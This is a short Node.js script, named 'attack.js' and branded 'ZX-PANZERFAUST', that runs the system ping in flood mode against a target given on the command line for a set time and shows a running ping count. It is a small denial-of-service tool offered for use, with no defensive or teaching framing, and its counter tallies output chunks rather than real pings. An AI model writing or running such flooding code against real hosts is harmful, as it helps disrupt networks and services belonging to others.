const { spawn } = require('child_process');
const [target, time] = process.argv.slice(2);

if (!target || !time) {
    console.log("Usage: node attack.js <target> <time>");
    process.exit(1);
}

const cmd = spawn('ping', ['-f', '-i', '0.1', '-w', time, target]);  // Flood ping

let pings = 0;

const logPings = () => {
    process.stdout.write(`\rZX-PANZERFAUST pings: ${pings}`);  // Overwrite every 2 seconds
};

cmd.stdout.on('data', () => {
    pings++;
});

cmd.stderr.on('data', (data) => {
    console.error(`error: ${data}`);
});

cmd.on('exit', (code) => {
    console.log(`\nProcess exited with code ${code}`);
});

process.on('SIGINT', () => {
    cmd.kill();
    console.log(`\n--- ZX-PANZERFAUST OFF ---\npings: ${pings}`);
});

// Log every 2 seconds
setInterval(logPings, 2000);
